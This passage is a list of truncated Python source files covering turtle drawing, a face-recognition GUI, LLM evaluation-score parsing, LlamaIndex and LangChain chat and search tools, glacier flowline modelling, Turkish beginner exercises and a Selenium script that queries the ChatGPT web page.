nc.circle(40,30)\nc.circle(40,35)\nc.circle(170,30)\nc.rt(90)\nc.circle(40,60)\nc.circle(105,50)\nc.lt(126)\nc.circle(-70,60)\n#insideshell\nc.penup()\nc.goto(-200,-325)\nc.rt(80)\nc.pendown()\nc.color(\"red\")\nc.begin_fill()\nc.pencolor(\"red\")\nc.circle(100,30)\nc.circle(100,30)\nc.circle(900,10)\nc.circle(70,50)\nc.circle(30,50)\nc.circle(20,30)\nc.circle(120,40)\nc.circle(20,80)\nc.circle(20,80)\nc.rt(100)\nc.circle(-20,80)\nc.circle(-40,80)\nc.circle(-40,70)\nc.circle(-190,50)\nc.circle(-40,45)\nc.circle(-120,30)\nc.circle(-100,50)\nc.circle(-900,10)\nc.circle(-275,40)\nc.rt(85)\nc.circle(-20,30)\nc.circle(100,50)\nc.end_fill()\n#\nc.penup()\nc.goto(18,-335)\nc.pendown()\nc.pencolor(\"black\")\nc.lt(47)\nc.circle(-150,50)\nc.circle(-90,30)\nc.rt(18)\nc.circle(60,30)\nc.circle(178,50)\nc.rt(40)\n#insidahell\nc.penup()\nc.goto(-360,-5)\nc.lt(110)\nc.pendown()\nc.color(\"blue\")\nc.begin_fill()\nc.pencolor(\"blue\")\nc.circle(20,150)\nc.circle(80,30)\nc.circle(20,150)\nc.circle(80,30)\nc.end_fill()\n#\nc.penup()\nc.goto(-260,120)\nc.lt(150)\nc.pendown()\nc.color(\"blue\")\nc.begin_fill()\nc.pencolor(\"blue\")\nc.circle(20,150)\nc.circle(80,30)\nc.circle(20,150)\nc.circle(80,30)\nc.end_fill()\n#\nc.penup()\nc.goto(-200,180)\nc.lt(130)\nc.pendown()\nc.color(\"blue\")\nc.begin_fill()\nc.pencolor(\"blue\")\nc.circle(20,150)\nc.circle(80,30)\nc.circle(20,150)\nc.circle(80,30)\nc.end_fill()\n#\nc.penup()\nc.goto(-50,50)\nc.lt(120)\nc.pendown()\nc.color(\"blue\")\nc.begin_fill()\nc.pencolor(\"blue\")\nc.circle(20,150)\nc.circle(80,30)\nc.circle(20,150)\nc.circle(80,30)\nc.end_fill()\n#\nc.penup()\nc.goto(0,-30)\nc.lt(150)\nc.pendown()\nc.color(\"blue\")\nc.begin_fill()\nc.pencolor(\"blue\")\nc.circle(20,150)\nc.circle(80,30)\nc.circle(20,150)\nc.circle(80,30)\nc.end_fill()\n#insideeye\nc.penup()\nc.goto(170,180)\nc.pendown()\nc.color(\"red\")\nc.begin_fill()\nc.pencolor(\"red\")\nc.circle(50)\nc.end_fill()\n#\nc.penup()\nc.goto(145,170)\nc.pendown()\nc.color(\"black\")\nc.begin_fill()\nc.pencolor(\"black\")\nc.circle(20)\nc.end_fill()\n#inisdeeyel\nc.penup()\nc.goto(410,180)\nc.pendown()\nc.color(\"red\")\nc.begin_fill()\nc.pencolor(\"red\")\nc.circle(50)\nc.end_fill()\n#\nc.penup()\nc.goto(385,170)\nc.pendown()\nc.color(\"black\")\nc.begin_fill()\nc.pencolor(\"black\")\nc.circle(20)\nc.end_",
    "from pathlib import Path\r\nfrom collections import Counter\r\nfrom PIL import Image, ImageDraw\r\nfrom PyQt5.QtWidgets import QMainWindow, QApplication, QPushButton, QLabel, QFileDialog\r\nfrom PyQt5 import uic\r\nfrom PyQt5.QtGui import QPixmap\r\n\r\nimport pickle\r\nimport face_recognition\r\nimport sys\r\nimport os\r\nimport io\r\n\r\n\r\nclass UI(QMainWindow):\r\n\r\n    DEFAULT_ENCODINGS_PATH = Path(\"output/encodings.pkl\")\r\n    RECOGNIZEPATH = Path(\"unknown\")\r\n    BOUNDING_BOX_COLOR = \"blue\"\r\n    TEXT_COLOR = \"white\"\r\n    IMAGEQUEUE = []\r\n    IMAGESPOT = 0\r\n    \r\n    def __init__(self):\r\n        super(UI, self).__init__()\r\n\r\n        # Load the ui file\r\n        uic.loadUi(\"gui\\\\notAiThinkerGUI.ui\", self)\r\n\r\n        Path(\"training\").mkdir(exist_ok=True)\r\n        Path(\"output\").mkdir(exist_ok=True)\r\n        Path(\"validation\").mkdir(exist_ok=True)\r\n        Path(\"unknown\").mkdir(exist_ok=True)\r\n\r\n         # Define Widgets\r\n        self.buttonValidate = self.findChild(QPushButton, \"pushButton\")\r\n        self.buttonImages = self.findChild(QPushButton, \"pushButton_2\")\r\n        self.buttonRecognize = self.findChild(QPushButton, \"pushButton_3\")\r\n        self.buttonNext = self.findChild(QPushButton, \"pushButton_4\")\r\n        self.buttonEncode = self.findChild(QPushButton, \"pushButton_5\")\r\n        self.buttonBack = self.findChild(QPushButton, \"pushButton_6\")\r\n        self.label = self.findChild(QLabel, \"label\")\r\n        self.posLabel = self.findChild(QLabel, \"label_2\")\r\n\r\n        # Set Buttons\r\n        self.buttonImages.clicked.connect(self.changeImages)\r\n        self.buttonEncode.clicked.connect(self.encode_known_faces)\r\n        self.buttonValidate.clicked.connect(self.validate)\r\n        self.buttonRecognize.clicked.connect(self.wrapper)\r\n        self.buttonNext.clicked.connect(self.clickerNext)\r\n        self.buttonBack.clicked.connect(self.clickerBack)\r\n                        \r\n        # Show The App\r\n        self.show()\r\n\r\n        # Set placeholder\r\n        self.setDefault()\r\n\r\n\r\n    def changeImages(self):\r\n        fname = QFileDialog.getOpenFileName(self, \"Open File\", \"training\", \"All Files (*);;PNG Files (*.png);;Jpg Files (*.jpg)\")\r\n\r\n    def setDefault(self):\r\n        self.IMAGESPOT = 0\r\n        self.IMAGEQUEUE.clear()\r\n        self.processImage(Image.open(\"main.PNG\"))\r\n\r\n        self.pixmap = QPixmap()\r\n        self.pixmap.loadFromData(self.IMAGEQUEUE[0])\r\n        self.label.setPixmap(self.pixmap)\r\n\r\n\r\n    def clickerNext(self):\r\n        if(len(self.IMAGEQUEUE)>1 and self.IMAGESPOT < len(self.IMAGEQUEUE)-1):\r\n            self.IMAGESPOT += 1\r\n            self.resetLabel()\r\n            self.pixmap.loadFromData(self.IMAGEQUEUE[self.IMAGESPOT])\r\n            self.label.setPixmap(self.pixmap)\r\n\r\n    def clickerBack(self):\r\n        if(len(self.IMAGEQUEUE)>1 and self.IMAGESPOT > 0):\r\n            self.IMAGESPOT -= 1\r\n            self.resetLabel()\r\n            self.pixmap.loadFromData(self.IMAGEQUEUE[self.IMAGESPOT])\r\n            self.label.setPixmap(self.pixmap)\r\n\r\n\r\n    def wrapper(self):\r\n\r\n        self.setDefault()\r\n\r\n        dirlist = os.listdir(self.RECOGNIZEPATH)\r\n\r\n        for x in dirlist:\r\n            self.recognize_faces(\"unknown/\" + x)\r\n\r\n        self.resetLabel()\r\n\r\n\r\n    def resetLabel(self):\r\n\r\n        self.posLabel.setText(str(self.IMAGESPOT+1) + \" / \" + str(len(self.IMAGEQUEUE)))\r\n\r\n          \r\n    def encode_known_faces(self, model: str = \"hog\", encodings_location: Path = DEFAULT_ENCODINGS_PATH):\r\n        names = []\r\n        encodings = []\r\n        for filepath in Path(\"training\").glob(\"*/*\"):\r\n            name = filepath.parent.name\r\n            image = face_recognition.load_image_file(filepath)\r\n\r\n            face_locations = face_recognition.face_locations(image, model=model)\r\n            face_encodings = face_recognition.face_encodings(image, face_locations)\r\n\r\n            for encoding in face_encodings:\r\n                names.append(name)\r\n                encodings.append(encoding)\r\n\r\n        name_encodings = {\"names\": names, \"encodings\": encodings}\r\n        with encodings_location.open(mode=\"wb\") as f:\r\n            pickle.dump(name_encodings, f)\r\n\r\n\r\n    def recognize_faces(self, image_location: str, model: str = \"hog\", encodings_location: Path = DEFAULT_ENCODINGS_PATH):\r\n        \r\n        with encodings_location.open(mode=\"rb\") as f:\r\n            loaded_encodings = pickle.load(f)\r\n\r\n        input_image = face_recognition.load_image_file(image_location)\r\n\r\n        input_face_locations = face_recognition.face_locations(input_image, model=model)\r\n\r\n        input_face_encodings = face_recognition.face_encodings(input_image, input_face_locations)\r\n\r\n        pillow_image = Image.fromarray(input_image)\r\n\r\n        draw = ImageDraw.Draw(pillow_image)\r\n\r\n        for bounding_box, unknown_encoding in zip(input_face_locations, input_face_encodings):\r\n\r\n            name = self._recognize_face(unknown_encoding, loaded_encodings)\r\n\r\n            if not name:\r\n                name = \"Unknown\"\r\n            self._display_face(draw, boundi",
    "from pathlib import Path\nfrom collections import defaultdict\nimport fire\nimport jsonlines\nimport pickle\nimport re\nimport numpy as np\n\nfrom batched_chatgpt import call_chatgpt\n\nGREEN = '\\033[92m'\nCYAN = '\\033[96m'\nRED = '\\033[91m'\nBLUE = '\\033[94m'\nBOLD = '\\033[1m'\nEND = '\\033[0m'\n\nCHATGPT_MODEL_NAME = \"gpt-4-0125-preview\"\n\n\n# test function\ndef pattern_check(p1, p2, p3, s):\n    print(s)\n    if len(p1.findall(s)) == 5:\n        print(\"\u2606\u2606\u2606p1 matched\")\n        print(p1.findall(s))\n    elif len(p2.findall(s)) == 5:\n        print(\"\u2606\u2606\u2606p2 matched\")\n        print(p2.findall(s))\n    elif len(p3.findall(s)) == 5:\n        print(\"\u2606\u2606\u2606p3 matched\")\n        print(p3.findall(s))\n    else:\n        raise AssertionError\n\n\ndef parse_chatgpt_answer(s: str):\n    # score or N/A are possible\n\n    # pattern 1: ideal situation, \"- Fluency (1-5): 0\"\n    p1 = re.compile(\n        r\".*((?:fluency)|(?:coherence)|(?:accuracy)|(?:completeness)|(?:overall quality))\\s*(?:\\(?.*\\))?\\s*:\\s*(\\d|N/A)\",\n        re.IGNORECASE\n    )\n    # pattern 2: \"- Fluency (5)\"\n    p2 = re.compile(\n        r\".*((?:fluency)|(?:coherence)|(?:accuracy)|(?:completeness)|(?:overall quality))\\s*\\((\\d|N/A)\\)\",\n        re.IGNORECASE\n    )\n    # pattern 3: \"- Fluency (1-5)\" or \"- Fluency (1/5)\"\n    p3 = re.compile(\n        r\".*((?:fluency)|(?:coherence)|(?:accuracy)|(?:completeness)|(?:overall quality))\\s*\\((\\d|N/A)[-/]5\\)\",\n        re.IGNORECASE\n    )\n\n    scores = {}\n    for p in (p1, p2, p3):\n        l = p.findall(s)  # [('Fluency', '5'), ('Coherence', '1'), ('Accuracy', '2'), ('Completeness', '2'), ('Overall Quality', '2')]\n        if len(l) != 5:\n            continue\n        else:\n            for item in l:\n                if item[1] == 'N/A':\n                    score = 1  # score is 1 when 'N/A' given.\n                else:\n                    score = int(item[1])\n                scores[item[0].lower()] = score\n            break\n    assert set(scores.keys()) == {'fluency', 'coherence', 'accuracy', 'completeness', 'overall quality'}, f\"FAIL:\\n{s}\"\n    return scores\n\n\ndef main(\n    generation_result_path: str,\n    evaluation_result_path: str,\n    use_api: bool = False,\n):\n    # load generation result\n    j = jsonlines.open(generation_result_path)\n    gen_results = [e for e in j.iter()]\n    for key in ['instruction', 'input', 'answer']:\n        assert key in gen_results[0].keys()\n\n    # load AI evaluation template\n    with open(\"evaluation_templates/en_template_for_llm_eval_input.txt\", 'rt') as f:\n        template_with_input = f.read()\n    with open(\"evaluation_templates/en_template_for_llm_eval_noinput.txt\", 'rt') as f:\n        template_with_noinput = f.read()\n\n    # Apply template\n    chatgpt_inputs = []\n    for gen in gen_results:\n        if gen['input']:\n            chatgpt_inputs.append(template_with_input.format_map({\n                'instruction': gen['instruction'],\n                'input': gen['input'],\n                'response': gen['answer']\n            }))\n        else:\n            chatgpt_inputs.append(template_with_noinput.format_map({\n                'instruction': gen['instruction'],\n                'response': gen['answer']\n            }))\n\n    # Do AI evaluation and save result\n    if use_api:\n        print(f\"Current ChatGPT model: {CHATGPT_MODEL_NAME}\")\n        evaluation_results = call_chatgpt(\n            chatgpt_inputs,\n            system_message=\"You're a helpful assistant and a Korean language expert.\",\n            model_name=CHATGPT_MODEL_NAME,\n            pkl_path=evaluation_result_path,\n            chunk_size=20\n        )\n    else:\n        with open(evaluation_result_path, 'rb') as f:\n            evaluation_results = pickle.load(f)\n\n    # Parse AI response\n    not_parseable_count = 0\n    scores = {\n        \"fluency\": [],\n        \"coherence\": [],\n        \"accuracy\": [],\n        \"completeness\": [],\n        \"overall quality\": [],\n    }\n    for result in evaluation_results:\n        try:\n            parsed = parse_chatgpt_answer(result)\n            for k, v in parsed.items():\n                scores[k].append(v)\n        except AssertionError:\n            not_parseable_count += 1\n    assert len(scores['fluency']) + not_parseable_count == len(evaluation_results)\n\n    scores = dict({'fluency ': scores['fluency']}, **scores)  # For beautiful display\n    del(scores['fluency'])\n\n    # Print parsed result\n    # scores and abandoned number will be printed\n    averages = {k: np.average(v) for k, v in scores.items()}\n    stddev = {k: np.std(v) for k, v in scores.items()}\n    print()\n    print(f\"RESULT PATH: {evaluation_result_path}\")\n    print(BLUE + \"===================================\" + END)\n    print(CYAN + f\"  The number of all examples: \" + END + f\"{len(evaluation_results)}\")\n    print(GREEN + f\"  Parsing successes: \" + END + f\"{len(evaluation_results) - not_parseable_count}\")\n    print(RED + f\"  Parsing failed: \" + END + f\"{not_parseable_count}\")\n    print(BLUE + \"===================================\" + END)\n    print(BOLD + \"   CRITERIA\\tAVG\\tSTD\" + E",
    "import os\nimport logging\nimport chainlit as cl\n\n\nfrom llama_index.core import (\n    Settings,\n    StorageContext,\n    VectorStoreIndex,\n    SimpleDirectoryReader,\n    load_index_from_storage,\n)\nfrom llama_index.core.agent import AgentChatResponse\nfrom llama_index.core.base.response.schema import AsyncStreamingResponse\nfrom llama_index.core.chat_engine.types import (\n    BaseChatEngine,\n    StreamingAgentChatResponse,\n)\nfrom llama_index.llms.anthropic import Anthropic\nfrom llama_index.embeddings.fastembed import FastEmbedEmbedding\nfrom llama_index.core.callbacks import CallbackManager\nfrom llama_index.core.memory import ChatMemoryBuffer\n\nlogger = logging.getLogger()\n\n\nasync def get_index():\n    documents = SimpleDirectoryReader(\n        \"./data\", recursive=True, filename_as_id=True\n    ).aload_data()\n\n    try:\n        logger.info(\"Loading existing index from 'storage'.\")\n\n        storage_context = StorageContext.from_defaults(persist_dir=\"./storage\")\n        index = load_index_from_storage(storage_context)\n        index.refresh_ref_docs(await documents)\n    except FileNotFoundError:\n        logger.info(\"Building new index from 'data'.\")\n\n        # If data directory doesn't exist, create it with hello world txt\n        if not os.path.exists(\"./data\"):\n            print(\"Creating data directory with hello_world.txt\")\n            os.makedirs(\"./data\")\n            with open(\"./data/hello_world.txt\", \"w\") as f:\n                f.write(\"Hello, world!\")\n\n        index = VectorStoreIndex(await documents, show_progress=True, use_async=True)\n\n    index.storage_context.persist()\n\n    return index\n\n\n# Memoize chat_engine\n_chat_engine = None\n\n\nasync def get_chat_engine():\n    global _chat_engine\n    logger.info(\"Getting query engine.\")\n\n    if not _chat_engine:\n        Settings.llm = Anthropic(\n            model=\"claude-3-sonnet-20240229\", temperature=0.1, max_tokens=4096\n        )\n        Settings.embed_model = FastEmbedEmbedding(model_name=\"thenlper/gte-large\")\n        Settings.context_window = 200 * 1024\n\n        callback_manager = CallbackManager([cl.LlamaIndexCallbackHandler()])\n        Settings.callback_manager = callback_manager\n\n        index = await get_index()\n\n        memory = ChatMemoryBuffer.from_defaults(token_limit=10 * 1024)\n\n        _chat_engine = index.as_chat_engine(\n            similarity_top_k=10, memory=memory, streaming=True\n        )\n\n    return _chat_engine\n\n\n@cl.on_chat_start\nasync def start():\n    await cl.Message(\n        author=\"Assistant\", content=\"Hello! Im an AI assistant. How may I help you?\"\n    ).send()\n\n    cl.user_session.set(\"chat_engine\", await get_chat_engine())\n\n\n@cl.on_message\nasync def main(message: cl.Message):\n    chat_engine = cl.user_session.get(\"chat_engine\")\n    assert isinstance(chat_engine, BaseChatEngine)\n\n    msg = cl.Message(content=\"\", author=\"Assistant\")\n\n    res = await chat_engine.astream_chat(message.content)\n    assert isinstance(res, StreamingAgentChatResponse)\n\n    async for token in res.async_response_gen():\n        await msg.stream_token(token)\n    await msg.send()\n",
    "import json\nimport arxiv\nfrom langchain.retrievers import ParentDocumentRetriever\nfrom langchain_community.tools.tavily_search import TavilySearchResults\nfrom langchain_community.tools.wikipedia.tool import WikipediaQueryRun\nfrom langchain_community.utilities.wikipedia import WikipediaAPIWrapper\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain_core.stores import BaseStore\n\nfrom Tool.Custom_TavilySearchResults import Custom_TavilySearchResults, Custom_TavilySearchAPIWrapper\n\n\ntest_extractor_prompt= ChatPromptTemplate.from_template(\"\"\"You are a professional context extractor.\n\nGiven the following question and context, your task is extract any part of the context *AS IS* that is relevant to answer the question.\nIf none of the context is relevant return NO_OUTPUT.\n\n\n<restrictions>\n1. *DO NOT* edit the extracted parts of the context.\n2. *DO NOT* prefixing any response. Just extracted parts of the context.\n</restrictions>\n\n> Question: {question}\n> Context:\n>>>\n{context}\n>>>\nExtracted relevant parts:\"\"\")\n\n# llm = get_cohere_model()\n# llm = get_anthropic_model(model_name='sonnet')\n# chain = test_extractor_prompt | llm | StrOutputParser()\n\ndef web_search(\n        query: str,\n        datastore: BaseStore,\n        retriever: ParentDocumentRetriever\n):\n    print(query)\n    print(\"---SEARCHING IN WEB(Using TAVILY API)---\")\n    tavily_search_tool = Custom_TavilySearchResults(\n        api_wrapper=Custom_TavilySearchAPIWrapper(),\n        include_answer=True,\n        include_raw_content=True\n    )\n\n    try:\n        search_results = tavily_search_tool.invoke({\"query\": query})\n        docs = search_results[\"results\"]\n        web_results = f\"<overall_summary>{search_results['answer']}</overall_summary>\"\n        raw_content_summary = \"\"\n        for index, doc in enumerate(docs, start=1):\n            web_results += (f\"<document index='{index}'>\\n\"\n                            \"<document_content>\\n\"\n                            f\"{doc['content']}\"\n                            \"</document_content>\\n\"\n                            f\"<source>{doc['url']}</source>\\n\"\n                            \"</document>\\n\\n\")\n            # raw_content_summary += chain.invoke({'question': query, 'context': doc['raw_content']}) + \"\\n\\n\"\n\n        print(\"---TAVILY SEARCH DONE---\")\n        return web_results\n    except Exception as e:\n        print(f\"---TAVILY SEARCH ERROR: {e}---\")\n        return \"Tavily Search Error! Try Again!\"\n\n\ndef youtube_search(\n        query: str\n) -> str:\n    from youtube_search import YoutubeSearch\n    print(\"---SEARCHING IN YOUTUBE---\")\n    results = YoutubeSearch(query, max_results=5).to_json()\n    data = json.loads(results)\n\n    final_results = \"\"\n    for index, video in enumerate(data[\"videos\"], start=1):\n        final_results += f\"\"\"<youtube index=\"{index}\">\n<title>{video['title']}</title>\n<views>{video['views']}</views>\n<publish_time>{video['publish_time']}</publish_time>\n<link>https://www.youtube.com{video['url_suffix']}</link>\n</youtube>\n\"\"\"\n    print(\"---YOUTUBE SEARCH DONE---\")\n    return final_results\n\n\ndef arXiv_search(\n        query: str\n) -> str:\n    print(\"---SEARCHING IN ARXIV---\")\n    client = arxiv.Client()\n    search = arxiv.Search(\n        query=query,\n        max_results=5,\n        sort_by=arxiv.SortCriterion.Relevance\n    )\n    results = client.results(search)\n    arxiv_results = \"\"\n    for index, r in enumerate(results, start=1):\n        arxiv_results += f\"\"\"<papers index=\"{index}\">\n<title>{r.title}</title>\n<link>{r.entry_id}</link>\n<published>{r.published}</published>\n</papers>\n\"\"\"\n    print(\"---ARXIV SEARCH DONE---\")\n    return arxiv_results\n\n\ndef wikipedia_search(query: str) -> str:\n    print(\"---SEARCHING IN WIKIPEDIA---\")\n    wikipedia = WikipediaQueryRun(api_wrapper=WikipediaAPIWrapper())\n    results = wikipedia.run(query)\n    print(f\"---WIKIPEDIA SEARCH RESULT---\\n{results}\")\n\n    print(\"---WIKIPEDIA SEARCH DONE---\")\n    return results",
    "\"\"\"Flowline modelling: bed shapes and model numerics.\n\n\n\"\"\"\n# Builtins\nimport logging\nimport copy\nfrom collections import OrderedDict\nfrom functools import partial\nfrom time import gmtime, strftime\nimport os\nimport shutil\nimport warnings\n\n# External libs\nimport numpy as np\nimport shapely.geometry as shpg\nimport xarray as xr\n\n# Optional libs\ntry:\n    import salem\nexcept ImportError:\n    pass\n\n# Locals\nfrom oggm import __version__\nimport oggm.cfg as cfg\nfrom oggm import utils\nfrom oggm import entity_task\nfrom oggm.exceptions import InvalidParamsError, InvalidWorkflowError\nfrom oggm.core.massbalance import (MultipleFlowlineMassBalance,\n                                   ConstantMassBalance,\n                                   PastMassBalance,\n                                   RandomMassBalance)\nfrom oggm.core.centerlines import Centerline, line_order\nfrom oggm.core.inversion import find_sia_flux_from_thickness\n\n# Constants\nfrom oggm.cfg import SEC_IN_DAY, SEC_IN_YEAR\nfrom oggm.cfg import G, GAUSSIAN_KERNEL\n\n# Module logger\nlog = logging.getLogger(__name__)\n\nclass Flowline(Centerline):\n    \"\"\"Common logic for different types of flowlines used as input to the model\n\n    \"\"\"\n\n    def __init__(self, line=None, dx=1, map_dx=None,\n                 surface_h=None, bed_h=None, rgi_id=None,\n                 water_level=None):\n        \"\"\" Initialize a Flowline\n\n        Parameters\n        ----------\n        line : :py:class:`shapely.geometry.LineString`\n            the geometrical line of a :py:class:`oggm.Centerline`\n        dx : float\n            Grid spacing in pixel coordinates\n        map_dx : float\n            DEM grid spacing in meters\n        surface_h: :py:class:`numpy.ndarray`\n            elevation [m] of the flowline grid points\n        bed_h: :py:class:`numpy.ndarray`\n            elevation[m] of the bedrock at the flowline grid points\n        rgi_id : str\n            The glacier's RGI identifier\n        water_level : float\n            The water level (to compute volume below sea-level)\n        \"\"\"\n\n        # This is do add flexibility for testing\n        if dx is None:\n            dx = 1.\n        if line is None:\n            coords = np.arange(len(surface_h)) * dx\n            line = shpg.LineString(np.vstack([coords, coords * 0.]).T)\n\n        super(Flowline, self).__init__(line, dx, surface_h)\n\n        self._thick = utils.clip_min(surface_h - bed_h, 0.)\n        self.map_dx = map_dx\n        self.dx_meter = map_dx * self.dx\n        self.bed_h = bed_h\n        self.rgi_id = rgi_id\n        self.water_level = water_level\n\n        # volume not yet removed from the flowline\n        self.calving_bucket_m3 = 0\n\n    def has_ice(self):\n        return np.any(self.thick > 0)\n\n    @Centerline.widths.getter\n    def widths(self):\n        \"\"\"Compute the widths out of H and shape\"\"\"\n        return self.widths_m / self.map_dx\n\n    @property\n    def thick(self):\n        \"\"\"Needed for overriding later\"\"\"\n        return self._thick\n\n    @thick.setter\n    def thick(self, value):\n        self._thick = utils.clip_min(value, 0)\n\n    @Centerline.surface_h.getter\n    def surface_h(self):\n        return self._thick + self.bed_h\n\n    @surface_h.setter\n    def surface_h(self, value):\n        self.thick = value - self.bed_h\n\n    @property\n    def bin_area_m2(self):\n        # area of the grid point\n        # this takes the ice thickness into account\n        return np.where(self.thick > 0, self.widths_m, 0) * self.dx_meter\n\n    @property\n    def length_m(self):\n        # TODO: take calving bucket into account for fine tuned length?\n        lt = cfg.PARAMS.get('min_ice_thick_for_length', 0)\n        if cfg.PARAMS.get('glacier_length_method') == 'consecutive':\n            if (self.thick > lt).all():\n                nx = len(self.thick)\n            else:\n                nx = np.where(self.thick <= lt)[0][0]\n        else:\n            nx = len(np.where(self.thick > lt)[0])\n        return nx * self.dx_meter\n\n    @property\n    def volume_m3(self):\n        return utils.clip_min(np.sum(self.section * self.dx_meter) -\n                              getattr(self, 'calving_bucket_m3', 0), 0)\n\n    @property\n    def volume_km3(self):\n        return self.volume_m3 * 1e-9\n\n    def _vol_below_level(self, water_level=0):\n\n        thick = np.copy(self.thick)\n        n_thick = np.copy(thick)\n        bwl = (self.bed_h < water_level) & (thick > 0)\n        n_thick[~bwl] = 0\n        self.thick = n_thick\n        vol_tot = np.sum(self.section * self.dx_meter)\n        n_thick[bwl] = utils.clip_max(self.surface_h[bwl],\n                                      water_level) - self.bed_h[bwl]\n        self.thick = n_thick\n        vol_bwl = np.sum(self.section * self.dx_meter)\n        self.thick = thick\n        fac = vol_bwl / vol_tot if vol_tot > 0 else 0\n        return utils.clip_min(vol_bwl -\n                              getattr(self, 'calving_bucket_m3', 0) * fac, 0)\n\n    @property\n    def volume_bsl_m3(self):\n        return self._vol_below_level(water_level=0)\n\n    @property",
    "# 'multiprocessing' mod\u00fcl\u00fcnden 'Process' s\u0131n\u0131f\u0131n\u0131 ve 'os' mod\u00fcl\u00fcn\u00fc i\u00e7e aktar\u0131yoruz.\r\nfrom multiprocessing import Process\r\nimport os\r\n\r\n# 0'dan 9'a kadar olan say\u0131lar\u0131n karelerini hesaplay\u0131p yazd\u0131ran bir fonksiyon tan\u0131ml\u0131yoruz.\r\ndef square_numbers():\r\n    for i in range(10):  # 0'dan 9'a kadar d\u00f6ng\u00fc olu\u015fturur.\r\n        i * i  # Say\u0131n\u0131n karesini hesaplar (bu sonu\u00e7 kullan\u0131lm\u0131yor, sadece hesaplama yap\u0131l\u0131yor).\r\n        print(f\"kare: {i*i}  (PID: {os.getpid()})\")  # Kareyi ve mevcut i\u015flem ID'sini yazd\u0131r\u0131r.\r\n\r\n# Bu ifade, kodun do\u011frudan \u00e7al\u0131\u015ft\u0131r\u0131ld\u0131\u011f\u0131nda a\u015fa\u011f\u0131daki blo\u011fun \u00e7al\u0131\u015fmas\u0131n\u0131 sa\u011flar.\r\n# E\u011fer bu dosya bir mod\u00fcl olarak ba\u015fka bir yerden ithal edilirse bu blok \u00e7al\u0131\u015fmaz.\r\nif __name__ == '__main__':\r\n    processes = []  # \u0130\u015flem saklamak i\u00e7in bo\u015f bir liste olu\u015fturuyoruz.\r\n    num_processes = os.cpu_count()  # Bilgisayar\u0131n \u00e7ekirdek say\u0131s\u0131n\u0131 al\u0131yoruz.\r\n\r\n    # Bilgisayar\u0131n \u00e7ekirdek say\u0131s\u0131 kadar i\u015flem olu\u015fturuyoruz.\r\n    for i in range(num_processes):\r\n        p = Process(target=square_numbers)  # 'square_numbers' fonksiyonunu hedef alan bir i\u015flem olu\u015fturuyoruz.\r\n        processes.append(p)  # \u0130\u015flemi listeye ekliyoruz.\r\n        p.start()  # \u0130\u015flemi ba\u015flat\u0131yoruz.\r\n\r\n    # Olu\u015fturulan t\u00fcm i\u015flemlerin tamamlanmas\u0131n\u0131 bekliyoruz.\r\n    for p in processes:\r\n        p.join()  # \u0130\u015flemin tamamlanmas\u0131n\u0131 bekler.\r\n\r\n    # T\u00fcm i\u015flemler tamamland\u0131\u011f\u0131nda, \"i\u015flem bitti\" mesaj\u0131n\u0131 yazd\u0131r\u0131yoruz.\r\n    print(\"i\u015flem bitti\")\r\n",
    "def main():\r\n    try:\r\n        sayi_adedi = int(input(\"Ka\u00e7 say\u0131 gireceksiniz? \"))\r\n        sayilar = []\r\n\r\n        for i in range(sayi_adedi):\r\n            sayi = float(input(f\"{i+1}. say\u0131y\u0131 girin: \"))\r\n            sayilar.append(sayi)\r\n\r\n        tek_sayilar = [sayi for sayi in sayilar if sayi % 2 == 1]\r\n        cift_sayilar = [sayi for sayi in sayilar if sayi % 2 == 0]\r\n\r\n        tek_sayi_toplam = sum(tek_sayilar)\r\n        tek_sayi_ortalama = tek_sayi_toplam / len(tek_sayilar) if len(tek_sayilar) > 0 else 0\r\n\r\n        cift_sayi_toplam = sum(cift_sayilar)\r\n        cift_sayi_ortalama = cift_sayi_toplam / len(cift_sayilar) if len(cift_sayilar) > 0 else 0\r\n\r\n        print(\"\\nTek Say\u0131lar:\")\r\n        print(f\"Toplam: {tek_sayi_toplam}\")\r\n        print(f\"Ortalama: {tek_sayi_ortalama}\")\r\n\r\n        print(\"\\n\u00c7ift Say\u0131lar:\")\r\n        print(f\"Toplam: {cift_sayi_toplam}\")\r\n        print(f\"Ortalama: {cift_sayi_ortalama}\")\r\n\r\n    except ValueError:\r\n        print(\"Ge\u00e7ersiz bir giri\u015f yapt\u0131n\u0131z. L\u00fctfen say\u0131lar\u0131 do\u011fru bir \u015fekilde girin.\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "#@Autor: Felipe Frechiani de Oliveira\n#Este programa acessa o site do chatgpt e faz uma pergunta e captura a resposta por meio de um servidor do selenium.\n#Somente funcionou usando o firefox com o chrome n\u00e3o funcionou.  \n\nfrom selenium import webdriver\nimport time\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.firefox.options import Options\nfrom selenium.webdriver.common.action_chains import ActionChains\n\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\nfrom urllib.parse import urlparse, parse_qs\n\n\n\n\n\n# Fun\u00e7\u00e3o para fazer uma pergunta ao ChatGPT\ndef ask_gpt(question):\n\n    # Configura\u00e7\u00f5es do Selenium para se conectar a um servi\u00e7o Selenium remoto\n    selenium_host = 'selenium'  # Atualize com o endere\u00e7o IP ou o nome do host do seu servi\u00e7o Selenium remoto\n    selenium_port = '4444'  # Atualize com a porta em que o servi\u00e7o Selenium remoto est\u00e1 sendo executado\n    # URL da p\u00e1gina do ChatGPT\n    url = \"https://chat.openai.com/\"\n    print(\"Accessando url do chatgpt:\" + url)\n    print(\"Usando o broswer firefox...\")\n    # Configura\u00e7\u00e3o do WebDriver remoto\n    webdriver_remote_url = f\"http://{selenium_host}:{selenium_port}/wd/hub\"\n    print(\"Roda do selenium:\" + webdriver_remote_url)\n    firefox_options = Options()\n    browser = webdriver.Remote(webdriver_remote_url, options=firefox_options)\n\n    # Abre a p\u00e1gina do ChatGPT\n    try:   \n\n        browser.get(url)\n        print(\"URL da pagina:\" + browser.current_url)\n        print(\"Titulo da pagina:\" + browser.title)\n        time.sleep(2)  # Espera 3 segundos para garantir que a p\u00e1gina esteja carregada\n        # Insere a pergunta no campo de entrada\n        if browser is not None:       \n            input_field = browser.find_element(By.ID , \"prompt-textarea\")\n            #print(input_field)\n            actions = ActionChains(browser)\n            # Clica no bot\u00e3o\n            actions.click(input_field).perform()\n            input_field.send_keys(question)\n            # Clica no bot\u00e3o de enviar\n            submit_button = browser.find_element(By.XPATH , '//button[@data-testid=\"send-button\"]')\n            time.sleep(1)  # Espera 5 segundos para a resposta ser gerada\n            